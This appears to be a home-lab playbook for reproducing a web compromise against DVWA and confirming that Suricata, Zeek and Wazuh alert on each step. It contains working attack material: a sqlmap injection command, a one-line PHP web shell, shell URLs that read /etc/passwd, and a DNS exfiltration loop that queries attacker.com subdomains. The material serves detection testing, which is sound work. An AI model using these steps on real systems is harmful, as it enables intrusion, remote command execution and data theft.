# Playbook — Attack Chain 2: Web Compromise & DNS Exfiltration

Quick reference for reproducing the attack chain in the lab. Run commands in order.

---

## Prerequisites

- Victim (10.10.1.133): Apache + DVWA running, Wazuh Agent running, Security Level = Low
- Sensor (10.10.1.132): Suricata + Zeek + Wazuh Agent running
- Wazuh Server (10.10.1.131): Wazuh Manager running
- Attacker: Kali Linux (10.10.1.130), browser open

Verify services before starting:

```bash
# On Victim
sudo systemctl status apache2
sudo systemctl status mysql
sudo systemctl status wazuh-agent

# On Sensor
sudo systemctl status suricata
sudo /opt/zeek/bin/zeekctl status
```

---

## Step 1 — SQL Injection

**Machine:** Kali (10.10.1.130)

First, get session cookie:
1. Open browser → `http://10.10.1.133/dvwa/login.php`
2. Login: `admin` / `password`
3. Go to **DVWA Security** → set to **Low** → Submit
4. F12 → Application → Cookies → copy `PHPSESSID` value

Run sqlmap:

```bash
sqlmap -u "http://10.10.1.133/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<your-session-id>; security=low" \
  --dbs --batch
```

**Expected result:**
```
available databases:
[*] dvwa
[*] information_schema
```

**Expected alert:** Suricata rule 100004 — `EXPLOIT SQL Injection Attempt`

---

## Step 2 — Web Shell Upload

**Machine:** Kali (10.10.1.130)

Create web shell:

```bash
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
```

Upload via DVWA:
1. Browser → `http://10.10.1.133/dvwa/vulnerabilities/upload/`
2. Choose file → select `/tmp/shell.php` → Upload

**Expected result:**
```
../../hackable/uploads/shell.php succesfully uploaded!
```

**Expected alert:** Suricata rule 100005 — `EXPLOIT Web Shell Upload Attempt`

---

## Step 3 — Remote Code Execution

**Machine:** Kali (10.10.1.130)

Access web shell via browser:

```
http://10.10.1.133/dvwa/hackable/uploads/shell.php?cmd=id
```

**Expected result in browser:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Try additional commands:
```
http://10.10.1.133/dvwa/hackable/uploads/shell.php?cmd=whoami
http://10.10.1.133/dvwa/hackable/uploads/shell.php?cmd=uname+-a
http://10.10.1.133/dvwa/hackable/uploads/shell.php?cmd=cat+/etc/passwd
```

**Expected alert:** Suricata rule 100006 — `EXPLOIT Web Shell Command Execution`

---

## Step 4 — DNS Exfiltration

**Machine:** Kali (10.10.1.130) — via web shell on Victim

Trigger DNS exfiltration from Victim using web shell (victim machine makes the DNS queries):

```
http://10.10.1.133/dvwa/hackable/uploads/shell.php?cmd=for+i+in+$(seq+1+50);+do+nslookup+secret$i.attacker.com+10.10.1.131;+done
```

**What this does:** Forces the Victim (10.10.1.133) to send 50 rapid DNS queries, simulating data encoded in subdomain names being exfiltrated to attacker C2.

**Expected alert:** Suricata rule 100007 — `EXFIL DNS Exfiltration Attempt`  
**Source IP in alert:** `10.10.1.133` (Victim) — not the attacker

---

## Verify All Alerts

**On Sensor — check Suricata:**
```bash
sudo tail -30 /var/log/suricata/fast.log | grep -E "1000004|1000005|1000006|1000007"
```

**On Wazuh Server — check alerts:**
```bash
sudo grep -E "100004|100005|100006|100007" /var/ossec/logs/alerts/alerts.log | tail -20
```

**Check Zeek DNS log — verify victim DNS queries:**
```bash
sudo grep "attacker.com" /opt/zeek/logs/current/dns.log | head -10
```

**Check Slack:** Open `#all-wazuh-alerts` channel — should see 4 alerts for chain 2.

---

## Cleanup

Run after each lab session:

```bash
# On Victim — remove web shell
sudo rm /var/www/html/dvwa/hackable/uploads/shell.php

# Verify removal
ls /var/www/html/dvwa/hackable/uploads/
```
